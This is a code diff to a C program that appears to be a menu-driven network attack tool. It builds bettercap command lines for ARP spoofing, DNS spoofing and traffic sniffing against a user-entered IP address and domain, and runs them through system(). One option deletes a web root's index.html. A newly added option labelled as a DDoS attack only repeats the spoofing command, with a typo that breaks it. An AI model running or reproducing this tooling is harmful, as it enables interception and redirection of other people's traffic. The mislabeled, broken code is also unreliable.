@@ -51,7 +51,7 @@ int main(int args)
 	}
 	else if(option == 6)
 	{
-		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html ; wget http://youtube.com ;");
+		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html ; wget https://youtube.com ; dir");
 	}
 	else if(option ==7)
 	{
@@ -70,11 +70,28 @@ int main(int args)
     		printf("\n enter the website ");
     		scanf("%99s", attack);
     	
-		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on; net.sniff on; arp.spoof on'", ip_address, attack);
+		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on; net.sniff on'", ip_address, attack);
 
     
     		system(command);
     
 
+	}
+	else if(option == 9)
+	{
+		printf("SHHHHHHH lets launch ddos attack...");
+		char command[200];
+    		char ip_address[16]; // Assuming IPv4 address
+    		char attack[100];
+		printf("Enter the target IP address: ");
+    		scanf("%15s", ip_address);
+    
+    		printf("\n enter the website ");
+    		scanf("%99s", attack);
+    	
+		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on; net.sniff on, apr.spoof on'", ip_address, attack);
+
+    
+    		system(command);
 	}
 }
